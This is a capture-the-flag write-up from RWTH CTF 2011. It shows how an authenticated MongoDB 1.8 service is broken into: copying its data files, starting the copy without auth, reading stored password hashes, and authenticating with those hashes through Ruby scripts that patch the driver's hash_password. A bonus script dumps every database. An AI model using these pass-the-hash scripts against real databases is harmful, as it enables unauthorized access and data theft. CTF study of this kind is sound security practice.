--- 
title: RWTH CTF 2011 -- hacking into mongodb
author: zed
---

# look at running process first:

~~~
root@vulnbox:/opt/mongo183# ps ax|grep mongod
 3047 ?        Sl     0:00 /opt/mongo183/bin/mongod --dbpath /opt/mongo183/db1 --nohttpinterface --auth
~~~

So, it has db at **`/opt/mongo183/db1`** and is running with **`--auth`** switch (important!)

~~~
root@vulnbox:/opt/mongo183# cd /opt/mongo183
root@vulnbox:/opt/mongo183# ls -la db1
total 426436
drwxr-xr-x 2 mongo mongo      4096 Oct  1 11:23 .
drwxr-xr-x 5 root  root       4096 Oct  1 01:12 ..
-rw------- 1 mongo mongo  67108864 Sep 30 21:11 admin.0
-rw------- 1 mongo mongo 134217728 Sep 30 19:02 admin.1
-rw------- 1 mongo mongo  16777216 Sep 30 21:11 admin.ns
-rwxr-xr-x 1 mongo mongo         5 Oct  1 11:23 mongod.lock
-rw------- 1 mongo mongo  67108864 Oct  1 05:26 nfsv5.0
-rw------- 1 mongo mongo 134217728 Sep 30 21:56 nfsv5.1
-rw------- 1 mongo mongo  16777216 Oct  1 05:26 nfsv5.ns
~~~

# clone db

~~~
root@vulnbox:/opt/mongo183# cp -r db1 db2

root@vulnbox:/opt/mongo183# /opt/mongo183/bin/mongod --dbpath /opt/mongo183/db2 --port 4000
Sat Oct  1 11:33:05 [initandlisten] MongoDB starting : pid=3098 port=4000 dbpath=/opt/mongo183/db2 64-bit 
Sat Oct  1 11:33:05 [initandlisten] db version v1.8.3, pdfile version 4.5
Sat Oct  1 11:33:05 [initandlisten] git version: c206d77e94bc3b65c76681df5a6b605f68a2de05
Sat Oct  1 11:33:05 [initandlisten] build sys info: Linux bs-linux64.10gen.cc 2.6.21.7-2.ec2.v1.2.fc8xen #1 SMP Fri Nov 20 17:48:28 EST 2009 x86_64 BOOST_LIB_VERSION=1_41
Sat Oct  1 11:33:05 [initandlisten] waiting for connections on port 4000
Sat Oct  1 11:33:05 [websvr] web admin interface listening on port 5000
~~~

Now we started a copy of original DB, but at port 4000, (and admin interface on port 5000, but it's not important now)

# connect to cloned db

~~~
[zed@zmac ~]#mongo 10.11.77.2:4000
MongoDB shell version: 2.0.0
connecting to: 10.11.77.2:4000/test
> show dbs
admin   0.203125GB
local   (empty)
nfsv5   0.203125GB
test    (empty)
>
~~~

# dump users

~~~
> use admin
switched to db admin
> db.system.users.find()
{ "_id" : ObjectId("4e8091797db328fac9a4fb95"), "user" : "admin", "readOnly" : false, "pwd" : "65421288ebf0922c3ffe4b3da9be5c3f" }
> use nfsv5
switched to db nfsv5
> db.system.users.find()
{ "_id" : ObjectId("4e8091a57db328fac9a4fb96"), "pwd" : "3a75211be980547895dac0b6b1c3ec6b", "user" : "nfs" }
>
~~~

So the users are:

~~~
|  db   | user  | pw hash                          |
----------------------------------------------------
| admin | admin | 65421288ebf0922c3ffe4b3da9be5c3f |
| nfsv5 | nfs   | 3a75211be980547895dac0b6b1c3ec6b |
~~~

but how pw hash is calculated? maybe we can reverse it?
look at the [hash_password function in mongo ruby gem](https://github.com/mongodb/mongo-ruby-driver/blob/master/lib/mongo/util/support.rb#L43):

~~~
#!ruby
def hash_password(username, plaintext)
    # 'plaintext' is a plaintext password (Captain Obvious)
    Digest::MD5.hexdigest("#{username}:mongo:#{plaintext}")
end
~~~

so it can be bruteforced, if you have a lot of brute force :)
but we'll find another way in:

# standard way in (we don't know the password)

~~~
#!ruby
#!/usr/bin/env ruby
require 'mongo'

def dump h
  db = Mongo::Connection.new(h[:host]).db(h[:db])
  db.authenticate h[:user], h[:pass]

  p db.collections.map(&:name)
end

host = ARGV.first || '10.11.77.2'

dump(
  :host => host,
  :db   => "nfsv5",
  :user => "nfs",
  :pass => "dunno"
)
~~~

running:

~~~
[zed@zmac ctf]#./1.rb 
/Users/zed/.rvm/gems/ruby-1.9.2-p290/gems/mongo-1.4.0/lib/mongo/db.rb:139:in `issue_authentication': Failed to authenticate user 'nfs' on db 'nfsv5' (Mongo::AuthenticationError)
        from /Users/zed/.rvm/gems/ruby-1.9.2-p290/gems/mongo-1.4.0/lib/mongo/db.rb:117:in `authenticate'
        from ./1.rb:6:in `dump'
        from ./1.rb:17:in `<main>'
~~~

# another way in (using known password hash)

~~~
#!ruby
#!/usr/bin/env ruby
require 'mongo'

# we override the hash_password() method,
# now it will simply return it's 2nd argument as a hash
module Mongo
  module Support
    def hash_password username, pass
      pass
    end
  end
end

def dump h
  db = Mongo::Connection.new(h[:host]).db(h[:db])
  db.authenticate h[:user], h[:pass]

  p db.collections.map(&:name)
end

host = ARGV.first || '10.11.77.2'

dump(
  :host => host,
  :db   => "nfsv5",
  :user => "nfs",
  :pass => "3a75211be980547895dac0b6b1c3ec6b"
)
~~~

running:

~~~
[zed@zmac ctf]#./2.rb 
["system.users", "system.indexes", "keys", "blobs"]
~~~

**We're in!!** ^______^

# bonus script - dump all dbs using admin account

~~~
#!ruby
#!/usr/bin/env ruby
require 'mongo'

# we override the hash_password() method,
# now it will simply return it's 2nd argument as a hash
module Mongo
  module Support
    def hash_password username, pass
      pass
    end
  end
end

def dump h
  db = Mongo::Connection.new(h[:host]).db(h[:db])
  db.authenticate h[:user], h[:pass]

  puts "[.] databases: " + db.connection.database_names.inspect
  db.connection.database_names.each do |dbname|
    db.connection.db(dbname).collections.each do |c|
      puts "[.] #{dbname} :: #{c.name}"
      c.find().each do |object|
        puts "\t#{object.inspect}"
      end
    end
  end
end

host = ARGV.first || '10.11.77.2'

dump(
  :host => host,
  :db   => "admin",
  :user => "admin",
  :pass => "65421288ebf0922c3ffe4b3da9be5c3f"
)
~~~

example output:

~~~
[zed@zmac ctf]#./3.rb
[.] databases: ["admin", "nfsv5", "local"]
[.] admin :: system.users
        {"_id"=>BSON::ObjectId('4e8091797db328fac9a4fb95'), "user"=>"admin", "readOnly"=>false, "pwd"=>"65421288ebf0922c3ffe4b3da9be5c3f"}
[.] admin :: system.indexes
        {"name"=>"_id_", "ns"=>"admin.system.users", "key"=>{"_id"=>1}, "v"=>0}
        {"name"=>"user_1", "ns"=>"admin.system.users", "key"=>{"user"=>1}, "unique"=>false, "v"=>0}
[.] nfsv5 :: system.users
        {"_id"=>BSON::ObjectId('4e8091a57db328fac9a4fb96'), "pwd"=>"3a75211be980547895dac0b6b1c3ec6b", "user"=>"nfs"}
        {"_id"=>BSON::ObjectId('4e86212f78b78441e4d08fc1'), "user"=>"foo", "readOnly"=>false, "pwd"=>"3563025c1e89c7ad43fb63fcbcf1c3c6"}
        {"_id"=>BSON::ObjectId('4e86215578b78441e4d08fc2'), "user"=>"foo1", "readOnly"=>false, "pwd"=>"e7d834e23b15916ddaaba5fc66c62271"}
[.] nfsv5 :: system.indexes
        {"name"=>"_id_", "ns"=>"nfsv5.system.users", "key"=>{"_id"=>1}, "v"=>0}
        {"name"=>"_id_", "ns"=>"nfsv5.keys", "key"=>{"_id"=>1}, "v"=>0}
        {"name"=>"_id_", "ns"=>"nfsv5.blobs", "key"=>{"_id"=>1}, "v"=>0}
        {"name"=>"user_1", "ns"=>"nfsv5.system.users", "key"=>{"user"=>1}, "unique"=>false, "v"=>0}
[.] nfsv5 :: keys
        {"_id"=>BSON::ObjectId('4e81a9a7693475c5c73f9849'), "verify"=>"d2800dbe", "bids"=>[], "key"=>"3ed3c892"}
        {"_id"=>BSON::ObjectId('4e81aa5b693475c5c73f984b'), "verify"=>"ee7b0734", "bids"=>[], "key"=>"25eb04d6"}
        {"_id"=>BSON::ObjectId('4e8604785d5417b1e0291608'), "verify"=>"8ba99958", "bids"=>[], "key"=>"7cd83777"}
        {"_id"=>BSON::ObjectId('4e8605b75d5417b1e029160a'), "verify"=>"b9e38a48", "bids"=>[], "key"=>"809d543d"}
        {"_id"=>BSON::ObjectId('4e8606e35d5417b1e029160b'), "verify"=>"2e5255fb", "bids"=>[], "key"=>"acab1b53"}
        {"_id"=>BSON::ObjectId('4e86080f5d5417b1e029160d'), "verify"=>"d74f674a", "bids"=>[], "key"=>"bfea4ead"}
        {"_id"=>BSON::ObjectId('4e86093b5d5417b1e029160f'), "verify"=>"74593b38", "bids"=>[], "key"=>"64012573"}
        {"_id"=>BSON::ObjectId('4e860a675d5417b1e0291611'), "verify"=>"69bd6942", "bids"=>[], "key"=>"94cc7fce"}
        {"_id"=>BSON::ObjectId('4e860b945d5417b1e0291613'), "verify"=>"fba79512", "bids"=>[], "key"=>"8dd49386"}
        {"_id"=>BSON::ObjectId('4e860cc05d5417b1e0291615'), "verify"=>"a448a04e", "bids"=>[], "key"=>"22af4db3"}
        {"_id"=>BSON::ObjectId('4e860df85d5417b1e0291617'), "verify"=>"1e98c63f", "bids"=>[], "key"=>"ed19d281"}
        {"_id"=>BSON::ObjectId('4e860f255d5417b1e0291619'), "verify"=>"5d5a168b", "bids"=>[], "key"=>"a665403b"}
        {"_id"=>BSON::ObjectId('4e8610515d5417b1e029161b'), "verify"=>"af277a9a", "bids"=>[], "key"=>"8d205fb7"}
        {"_id"=>BSON::ObjectId('4e86117d5d5417b1e029161c'), "verify"=>"107040e5", "bids"=>[], "key"=>"475ce61e"}
        {"_id"=>BSON::ObjectId('4e8612a95d5417b1e029161e'), "verify"=>"587eafbe", "bids"=>[], "key"=>"c1033e34"}
        {"_id"=>BSON::ObjectId('4e8613e05d5417b1e0291620'), "verify"=>"b7b813f9", "bids"=>[], "key"=>"2bbf100b"}
        {"_id"=>BSON::ObjectId('4e86150c5d5417b1e0291621'), "verify"=>"d1d17995", "bids"=>[], "key"=>"462f5aa0"}
        {"_id"=>BSON::ObjectId('4e8616385d5417b1e0291622'), "verify"=>"e653921f", "bids"=>[], "key"=>"0723f952"}
        {"_id"=>BSON::ObjectId('4e8617645d5417b1e0291623'), "verify"=>"a1bf9186", "bids"=>[], "key"=>"d49e79d7"}
        {"_id"=>BSON::ObjectId('4e8618905d5417b1e0291625'), "verify"=>"d8ba597c", "bids"=>[], "key"=>"7f7171d3"}
        {"_id"=>BSON::ObjectId('4e8619bc5d5417b1e0291627'), "verify"=>"7cc3ec7a", "bids"=>[], "key"=>"d564672b"}
        {"_id"=>BSON::ObjectId('4e861ae85d5417b1e0291629'), "verify"=>"027c69b5", "bids"=>[], "key"=>"dad1434e"}
        {"_id"=>BSON::ObjectId('4e861c154159a14fc0943dc5'), "verify"=>"e85f8e08", "bids"=>[], "key"=>"8f4827a8"}
        {"_id"=>BSON::ObjectId('4e861d417ed1603745bfac30'), "verify"=>"4ad40f64", "bids"=>[], "key"=>"1ea7e633"}
        {"_id"=>BSON::ObjectId('4e861e707ed1603745bfac31'), "verify"=>"ee877f04", "bids"=>[], "key"=>"398ef2fb"}
        {"_id"=>BSON::ObjectId('4e863aa5c8a6838bfb7bc22d'), "verify"=>"41759097", "bids"=>[], "key"=>"8365f69e"}
        {"_id"=>BSON::ObjectId('4e863bd5c8a6838bfb7bc22e'), "verify"=>"12b94e6b", "bids"=>[], "key"=>"eff5e137"}
        {"_id"=>BSON::ObjectId('4e863cfdc8a6838bfb7bc230'), "verify"=>"3fc115ef", "bids"=>[], "key"=>"d4109de7"}
        {"_id"=>BSON::ObjectId('4e866e8b9b8fcb74e830896f'), "verify"=>"d13cd703", "bids"=>[], "key"=>"42e8c78a"}
        {"_id"=>BSON::ObjectId('4e866fae9b8fcb74e8308970'), "verify"=>"2376231b", "bids"=>[], "key"=>"c078fe13"}
        {"_id"=>BSON::ObjectId('4e8670de9b8fcb74e8308972'), "verify"=>"3d0704d1", "bids"=>[], "key"=>"8f0cf1ef"}
        {"_id"=>BSON::ObjectId('4e8672079b8fcb74e8308974'), "verify"=>"894fd139", "bids"=>[], "key"=>"c851b9c1"}
        {"_id"=>BSON::ObjectId('4e8673479b8fcb74e8308975'), "verify"=>"0e774564", "bids"=>[], "key"=>"a83b8deb"}
        {"_id"=>BSON::ObjectId('4e8674739b8fcb74e8308977'), "verify"=>"28b590a4", "bids"=>[], "key"=>"2e2725f7"}
        {"_id"=>BSON::ObjectId('4e86759f9b8fcb74e8308979'), "verify"=>"1590553f", "bids"=>[], "key"=>"22bffe29"}
        {"_id"=>BSON::ObjectId('4e8676cb9b8fcb74e830897a'), "verify"=>"14eb9011", "bids"=>[], "key"=>"4f699a01"}
        {"_id"=>BSON::ObjectId('4e8677f79b8fcb74e830897c'), "verify"=>"deaebf76", "bids"=>[], "key"=>"b63dc55f"}
        {"_id"=>BSON::ObjectId('4e8679239b8fcb74e830897e'), "verify"=>"57cdc9eb", "bids"=>[], "key"=>"97939493"}
        {"_id"=>BSON::ObjectId('4e867a509b8fcb74e830897f'), "verify"=>"f236ddfd", "bids"=>[], "key"=>"3abf67db"}
        {"_id"=>BSON::ObjectId('4e867b7c9b8fcb74e8308981'), "verify"=>"1d020b40", "bids"=>[], "key"=>"9fe13fa9"}
        {"_id"=>BSON::ObjectId('4e867ca89b8fcb74e8308983'), "verify"=>"202c025d", "bids"=>[], "key"=>"8faae597"}
        {"_id"=>BSON::ObjectId('4e867dd49b8fcb74e8308985'), "verify"=>"033cc20c", "bids"=>[], "key"=>"069b7d59"}
        {"_id"=>BSON::ObjectId('4e867f039b8fcb74e8308987'), "verify"=>"149efbb0", "bids"=>[], "key"=>"6d097e35"}
        {"_id"=>BSON::ObjectId('4e86802c9b8fcb74e8308989'), "verify"=>"4da81d4b", "bids"=>[], "key"=>"643a9c08"}
        {"_id"=>BSON::ObjectId('4e8681589b8fcb74e830898a'), "verify"=>"55d76527", "bids"=>[], "key"=>"d55243fb"}
        {"_id"=>BSON::ObjectId('4e86828d9b8fcb74e830898c'), "verify"=>"dd9b1265", "bids"=>[], "key"=>"d9f75fdd"}
        {"_id"=>BSON::ObjectId('4e8683b09b8fcb74e830898e'), "verify"=>"e94bd12d", "bids"=>[], "key"=>"13c73325"}
        {"_id"=>BSON::ObjectId('4e8684dc9b8fcb74e830898f'), "verify"=>"b85a25e0", "bids"=>[], "key"=>"114ded8b"}
        {"_id"=>BSON::ObjectId('4e8686099b8fcb74e8308991'), "verify"=>"a1f983c0", "bids"=>[], "key"=>"310d0503"}
        {"_id"=>BSON::ObjectId('4e8687359b8fcb74e8308992'), "verify"=>"ea24a190", "bids"=>[], "key"=>"4c0dbc17"}
        {"_id"=>BSON::ObjectId('4e8688619b8fcb74e8308993'), "verify"=>"c8f4e16b", "bids"=>[], "key"=>"a4bfea6e"}
[.] nfsv5 :: blobs
        {"_id"=>BSON::ObjectId('4e81a9ac693475c5c73f984a'), "owner"=>"3ed3c892", "bid"=>"801a77d1", "data"=>"a05a6fb2c9b786222a0e0dfdf53321ce7b9b5346"}
        {"_id"=>BSON::ObjectId('4e8604805d5417b1e0291609'), "owner"=>"7cd83777", "bid"=>"a3f764b6", "data"=>"8c68bf9e6c5f93ad50548dcc0fbbfb91e7c806db"}
        {"_id"=>BSON::ObjectId('4e8606ea5d5417b1e029160c'), "owner"=>"acab1b53", "bid"=>"11ac8751", "data"=>"5be4bad598ab75dc10f93bf25f19b5e81952101c"}
        {"_id"=>BSON::ObjectId('4e8608165d5417b1e029160e'), "owner"=>"bfea4ead", "bid"=>"64d744c9", "data"=>"59134f9faadec9a470c44fe71733b4cf405ab062"}
        {"_id"=>BSON::ObjectId('4e8609425d5417b1e0291610'), "owner"=>"64012573", "bid"=>"d1c1c5a9", "data"=>"661fcf9fd537c2370ccfd1172ce956cac7fb3c98"}
        {"_id"=>BSON::ObjectId('4e860a6b5d5417b1e0291612'), "owner"=>"94cc7fce", "bid"=>"63c2cac7", "data"=>"46100a20272606bbd1b0826c5da2cdd9bf6f390d"}
        {"_id"=>BSON::ObjectId('4e860b9a5d5417b1e0291614'), "owner"=>"8dd49386", "bid"=>"a2176f83", "data"=>"653ffad8c2375ace76f20130e0fcd3541ec46ab3"}
        {"_id"=>BSON::ObjectId('4e860cc35d5417b1e0291616'), "owner"=>"22af4db3", "bid"=>"117093dd", "data"=>"0c4e03117b15e4f4c10ffbe8e8079bd052fa67f9"}
        {"_id"=>BSON::ObjectId('4e860dfc5d5417b1e0291618'), "owner"=>"ed19d281", "bid"=>"6b84c153", "data"=>"39bc62c1a5d389ae0b64f2c6354ea796aaac7615"}
        {"_id"=>BSON::ObjectId('4e860f285d5417b1e029161a'), "owner"=>"a665403b", "bid"=>"4b392f90", "data"=>"5fd75354732aa601ca17e5985499a3fb000e0c9c"}
        {"_id"=>BSON::ObjectId('4e8611845d5417b1e029161d'), "owner"=>"475ce61e", "bid"=>"9cd8e7e5", "data"=>"96ff39bbd928f70a5df9cb6cfc16ce56f6f7f11d"}
        {"_id"=>BSON::ObjectId('4e8612ac5d5417b1e029161f'), "owner"=>"c1033e34", "bid"=>"da4aa78c", "data"=>"69ad5b745b000b9197b9988168a420e960a8adc2"}
        {"_id"=>BSON::ObjectId('4e8617725d5417b1e0291624'), "owner"=>"d49e79d7", "bid"=>"5f38b27a", "data"=>"f8eeb580dc36ddd54ec801c1056d4c6ee92da97e"}
        {"_id"=>BSON::ObjectId('4e8618a45d5417b1e0291626'), "owner"=>"7f7171d3", "bid"=>"1bfaac39", "data"=>"1da8f4d5b8698ea9b99c0e901de04cf94c5d4e64"}
        {"_id"=>BSON::ObjectId('4e8619c35d5417b1e0291628'), "owner"=>"d564672b", "bid"=>"3a7e1cc7", "data"=>"51f6612e47fcb9d071fd3c9a842759a11f8e9e1f"}
        {"_id"=>BSON::ObjectId('4e861af25d5417b1e029162a'), "owner"=>"dad1434e", "bid"=>"ea5c4180", "data"=>"d75af92aa0dda572362df79a7d8d180369de73e5"}
        {"_id"=>BSON::ObjectId('4e861c1e4159a14fc0943dc6'), "owner"=>"8f4827a8", "bid"=>"1e82a820", "data"=>"6869c8cafa54ece9a73e2b79c679d39b67cbc731"}
        {"_id"=>BSON::ObjectId('4e861e757ed1603745bfac32'), "owner"=>"398ef2fb", "bid"=>"2922c716", "data"=>"ad45674eb83381776ce263498cecca7795c6595e"}
        {"_id"=>BSON::ObjectId('4e863bdbc8a6838bfb7bc22f'), "owner"=>"eff5e137", "bid"=>"0e6710ff", "data"=>"d154554d572b14742d70bf31712f9a03854cc962"}
        {"_id"=>BSON::ObjectId('4e863d11c8a6838bfb7bc231'), "owner"=>"d4109de7", "bid"=>"debf34a4", "data"=>"0bea8dc910822953cc4da5552bdbdeffb3412af5"}
        {"_id"=>BSON::ObjectId('4e866fba9b8fcb74e8308971'), "owner"=>"c078fe13", "bid"=>"bcb71317", "data"=>"5be8d0ac644f87489a0bd5f2e52780c74b523a22"}
        {"_id"=>BSON::ObjectId('4e8670e69b8fcb74e8308973'), "owner"=>"8f0cf1ef", "bid"=>"bcac6e61", "data"=>"447ca6085116a9d2be377c53a8caaa6a159ed867"}
        {"_id"=>BSON::ObjectId('4e86734e9b8fcb74e8308976'), "owner"=>"a83b8deb", "bid"=>"f17292fe", "data"=>"e8dd3ef6238a08128348d0ef21552afb93984861"}
        {"_id"=>BSON::ObjectId('4e8674809b8fcb74e8308978'), "owner"=>"2e2725f7", "bid"=>"628a9a49", "data"=>"b59a03eb404025a2a23cd92842ba5816ddbef5c2"}
        {"_id"=>BSON::ObjectId('4e8676d49b8fcb74e830897b'), "owner"=>"4f699a01", "bid"=>"28793b6e", "data"=>"f759714a9679a1cbffc60d58bbb53f6d14522dc4"}
        {"_id"=>BSON::ObjectId('4e8678019b8fcb74e830897d'), "owner"=>"b63dc55f", "bid"=>"c54e8c6a", "data"=>"632bcf90a66467d047bd5223d2968331f047bdfb"}
        {"_id"=>BSON::ObjectId('4e867a569b8fcb74e8308980'), "owner"=>"3abf67db", "bid"=>"6c9f548e", "data"=>"90ef7231d12e4dfc529f5e65b2d88f06c1812086"}
        {"_id"=>BSON::ObjectId('4e867b8e9b8fcb74e8308982'), "owner"=>"9fe13fa9", "bid"=>"59a4f44a", "data"=>"19f9d653540e0623d22b7924b776779fac7ae7df"}
        {"_id"=>BSON::ObjectId('4e867cb09b8fcb74e8308984'), "owner"=>"8faae597", "bid"=>"349bbe0a", "data"=>"9530dc2f72d6b07c06c021cc4cd1298bb1f27d43"}
        {"_id"=>BSON::ObjectId('4e867dda9b8fcb74e8308986'), "owner"=>"069b7d59", "bid"=>"8dc2151b", "data"=>"d66dbd0dceba965b99e16dfe5ec4d13e90b895fa"}
        {"_id"=>BSON::ObjectId('4e867f159b8fcb74e8308988'), "owner"=>"6d097e35", "bid"=>"d3db5b5e", "data"=>"43533ad2d4962d6b338b03ea8867130a1fa47eb0"}
        {"_id"=>BSON::ObjectId('4e86815b9b8fcb74e830898b'), "owner"=>"d55243fb", "bid"=>"e41adecd", "data"=>"ebe4ee43029ac1edebe53aee2b0e72334a17b370"}
        {"_id"=>BSON::ObjectId('4e8682a19b8fcb74e830898d'), "owner"=>"d9f75fdd", "bid"=>"083aa9ba", "data"=>"6b1b73d4323ebb3edb50c26b01e9dc4e44e50d5f"}
        {"_id"=>BSON::ObjectId('4e8684e09b8fcb74e8308990'), "owner"=>"114ded8b", "bid"=>"42cdb6dc", "data"=>"72093d690674ae7c44602f91b262b8116cba5e24"}
~~~
